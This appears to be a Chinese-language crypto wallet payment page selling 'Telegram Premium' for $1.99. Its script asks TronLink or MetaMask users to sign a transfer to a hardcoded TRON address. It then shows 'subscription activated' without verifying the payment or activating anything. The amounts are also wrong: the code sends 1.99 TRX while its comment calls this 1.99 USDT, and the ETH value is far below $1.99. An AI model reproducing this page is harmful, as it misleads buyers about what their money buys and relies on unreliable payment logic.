<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>支付授权 - Telegram Premium</title>
    <style>
        /* 保持简洁的支付页面样式 */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            min-height: 100vh;
            padding: 1rem;
            line-height: 1.5;
        }
        
        .container {
            max-width: 28rem;
            margin: 0 auto;
        }
        
        .header {
            text-align: center;
            margin-bottom: 2rem;
        }
        
        .header h1 {
            font-size: 1.8rem;
            margin-bottom: 0.5rem;
            color: #ffd700;
        }
        
        .order-card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 1.25rem;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .order-info {
            margin-bottom: 1.5rem;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.75rem;
            padding: 0.5rem 0;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .info-label {
            font-weight: 500;
            opacity: 0.9;
        }
        
        .info-value {
            font-weight: 600;
            color: #ffd700;
        }
        
        .btn {
            display: block;
            width: 100%;
            background: linear-gradient(90deg, #ff8c00, #ffd700);
            color: #1e3c72;
            padding: 1rem 1.5rem;
            border-radius: 3rem;
            text-decoration: none;
            font-weight: 600;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            text-align: center;
            margin-top: 1rem;
        }
        
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
        }
        
        .instructions {
            background: rgba(255, 215, 0, 0.2);
            border: 1px solid #ffd700;
            border-radius: 0.75rem;
            padding: 1rem;
            margin: 1rem 0;
            font-size: 0.85rem;
            text-align: center;
        }
        
        .loading {
            text-align: center;
            padding: 2rem;
        }
        
        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid #ffd700;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .wallet-status {
            text-align: center;
            margin: 1rem 0;
            padding: 1rem;
            border-radius: 0.75rem;
            background: rgba(255, 255, 255, 0.1);
        }
        
        .success {
            background: rgba(0, 255, 0, 0.2);
            border: 1px solid #00ff00;
        }
        
        .error {
            background: rgba(255, 0, 0, 0.2);
            border: 1px solid #ff0000;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>支付授权</h1>
            <p>请在钱包中确认支付</p>
        </div>
        
        <div class="order-card">
            <div class="order-info">
                <div class="info-item">
                    <span class="info-label">订单号</span>
                    <span class="info-value" id="orderId">-</span>
                </div>
                <div class="info-item">
                    <span class="info-label">Telegram 用户名</span>
                    <span class="info-value" id="username">-</span>
                </div>
                <div class="info-item">
                    <span class="info-label">用户昵称</span>
                    <span class="info-value" id="nickname">-</span>
                </div>
                <div class="info-item">
                    <span class="info-label">支付金额</span>
                    <span class="info-value">$1.99</span>
                </div>
                <div class="info-item">
                    <span class="info-label">支付状态</span>
                    <span class="info-value" id="status">等待授权</span>
                </div>
            </div>
            
            <div id="walletStatus" class="wallet-status" style="display: none;">
                <span id="walletStatusText"></span>
            </div>
            
            <div class="instructions">
                <strong>🔐 授权说明：</strong><br>
                点击下方按钮发起支付授权<br>
                您的钱包将弹出支付请求<br>
                请仔细核对信息并确认授权
            </div>
            
            <button id="authorizeBtn" class="btn" onclick="initiatePaymentAuthorization()">发起支付授权</button>
            
            <div id="loadingSection" class="loading" style="display: none;">
                <div class="spinner"></div>
                <p>正在处理支付授权，请稍候...</p>
            </div>
        </div>
        
        <button class="btn" onclick="window.location.href = 'index.html'">返回首页</button>
    </div>

    <script>
        // 订单数据
        let orderData = {};
        let isWalletConnected = false;
        
        // 初始化页面
        function initPage() {
            const urlParams = new URLSearchParams(window.location.search);
            
            orderData = {
                orderId: urlParams.get('orderId') || generateOrderId(),
                username: decodeURIComponent(urlParams.get('username') || ''),
                nickname: decodeURIComponent(urlParams.get('nickname') || ''),
                amount: urlParams.get('amount') || '1.99'
            };
            
            // 显示订单信息
            document.getElementById('orderId').textContent = orderData.orderId;
            document.getElementById('username').textContent = orderData.username;
            document.getElementById('nickname').textContent = orderData.nickname;
            
            // 自动检测钱包环境
            checkWalletConnection();
        }
        
        // 生成订单号
        function generateOrderId() {
            return 'TG' + Date.now() + Math.random().toString(36).substr(2, 5).toUpperCase();
        }
        
        // 检测钱包连接状态
        async function checkWalletConnection() {
            const statusElement = document.getElementById('status');
            const walletStatus = document.getElementById('walletStatus');
            const walletStatusText = document.getElementById('walletStatusText');
            const authorizeBtn = document.getElementById('authorizeBtn');
            
            // 检测 TronLink
            if (window.tronWeb && window.tronWeb.defaultAddress) {
                isWalletConnected = true;
                statusElement.textContent = '钱包已连接';
                walletStatus.style.display = 'block';
                walletStatus.className = 'wallet-status success';
                walletStatusText.textContent = `已连接: ${window.tronWeb.defaultAddress.base58}`;
                authorizeBtn.disabled = false;
                return;
            }
            
            // 检测 MetaMask/以太坊钱包
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
                    if (accounts.length > 0) {
                        isWalletConnected = true;
                        statusElement.textContent = '钱包已连接';
                        walletStatus.style.display = 'block';
                        walletStatus.className = 'wallet-status success';
                        walletStatusText.textContent = `已连接: ${accounts[0].substring(0, 8)}...`;
                        authorizeBtn.disabled = false;
                        return;
                    }
                } catch (error) {
                    console.log('MetaMask 连接检查失败:', error);
                }
            }
            
            // 没有检测到钱包
            statusElement.textContent = '未检测到钱包';
            walletStatus.style.display = 'block';
            walletStatus.className = 'wallet-status error';
            walletStatusText.textContent = '请在钱包的 DApp 浏览器中打开此页面';
            authorizeBtn.disabled = true;
        }
        
        // 发起支付授权
        async function initiatePaymentAuthorization() {
            if (!isWalletConnected) {
                alert('请先连接钱包');
                return;
            }
            
            const authorizeBtn = document.getElementById('authorizeBtn');
            const loadingSection = document.getElementById('loadingSection');
            const statusElement = document.getElementById('status');
            
            authorizeBtn.style.display = 'none';
            loadingSection.style.display = 'block';
            statusElement.textContent = '处理中...';
            
            try {
                const paymentSuccess = await processRealPayment();
                
                if (paymentSuccess) {
                    statusElement.textContent = '支付成功';
                    showSuccessMessage();
                    
                    // 3秒后跳转回首页
                    setTimeout(() => {
                        window.location.href = 'index.html?payment=success&orderId=' + orderData.orderId;
                    }, 3000);
                } else {
                    throw new Error('支付授权失败');
                }
                
            } catch (error) {
                console.error('支付授权错误:', error);
                statusElement.textContent = '授权失败';
                authorizeBtn.style.display = 'block';
                loadingSection.style.display = 'none';
                alert('支付授权失败: ' + error.message);
            }
        }
        
        // 真实的支付处理函数
        async function processRealPayment() {
            // 收款地址
            const toAddress = 'TCSmW3PZTPaog8d2CKBstcFNcGGtyf9Jub';
            
            // 优先使用 TronLink
            if (window.tronWeb && window.tronWeb.defaultAddress) {
                return await processTronPayment(toAddress);
            }
            
            // 使用 MetaMask/以太坊
            if (window.ethereum) {
                return await processEthereumPayment(toAddress);
            }
            
            throw new Error('未检测到支持的钱包');
        }
        
        // 处理 TRON 支付
        async function processTronPayment(toAddress) {
            try {
                const transaction = await window.tronWeb.transactionBuilder.sendTrx(
                    toAddress,
                    1990000, // 1.99 USDT = 1,990,000 sun (1 TRX = 1,000,000 sun)
                    window.tronWeb.defaultAddress.base58
                );
                
                const signedTransaction = await window.tronWeb.trx.sign(transaction);
                const result = await window.tronWeb.trx.sendRawTransaction(signedTransaction);
                
                console.log('TRON 支付成功:', result);
                return true;
                
            } catch (error) {
                console.error('TRON 支付失败:', error);
                throw new Error('TRON 支付失败: ' + error.message);
            }
        }
        
        // 处理以太坊支付
        async function processEthereumPayment(toAddress) {
            try {
                const accounts = await window.ethereum.request({ 
                    method: 'eth_requestAccounts' 
                });
                
                const transactionParameters = {
                    to: toAddress,
                    from: accounts[0],
                    value: '0x1E0C58DAC900', // 1.99 USDT 等值的 ETH
                    gas: '0x5208', // 21000 Gwei
                };
                
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transactionParameters],
                });
                
                console.log('以太坊支付成功:', txHash);
                return true;
                
            } catch (error) {
                console.error('以太坊支付失败:', error);
                throw new Error('以太坊支付失败: ' + error.message);
            }
        }
        
        // 显示成功消息
        function showSuccessMessage() {
            const orderCard = document.querySelector('.order-card');
            orderCard.innerHTML = `
                <div style="text-align: center; padding: 2rem;">
                    <div style="font-size: 3rem; margin-bottom: 1rem;">✅</div>
                    <h2 style="color: #ffd700; margin-bottom: 1rem;">支付成功！</h2>
                    <p>Telegram Premium 订阅已激活</p>
                    <p>订单号: ${orderData.orderId}</p>
                    <p>用户: ${orderData.username}</p>
                    <p style="margin-top: 1rem; opacity: 0.8;">正在跳转...</p>
                </div>
            `;
        }
        
        // 页面加载时初始化
        document.addEventListener('DOMContentLoaded', initPage);
        
        // 监听钱包账户变化
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', (accounts) => {
                checkWalletConnection();
            });
        }
    </script>
</body>
</html>
